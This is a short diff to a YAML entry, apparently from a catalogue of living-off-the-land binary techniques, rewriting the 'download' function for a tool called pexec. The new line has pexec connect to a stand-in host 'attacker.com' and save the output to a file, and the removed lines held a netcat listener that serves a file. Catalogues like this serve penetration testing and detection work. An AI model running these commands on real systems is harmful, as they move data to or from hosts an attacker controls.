@@ -12,13 +12,11 @@ functions:
       unprivileged:
   download:
   - code: |-
-      pexec --remote --connect $IP_ADDR:9000 > $OUT_FILE
+      pexec --remote --connect attacker.com:12345 > /path/to/output-file
+    binary: false
     contexts:
       unprivileged:
-    sender:
-      code: |-
-        nc -l -p 9000 < $IN_FILE
-      comment: |-
-        A TCP server can be used on the attacker box to send the data.
-
+    comment:
+      Downloads one line after sending a command.
+    sender: tcp-server      
 ...
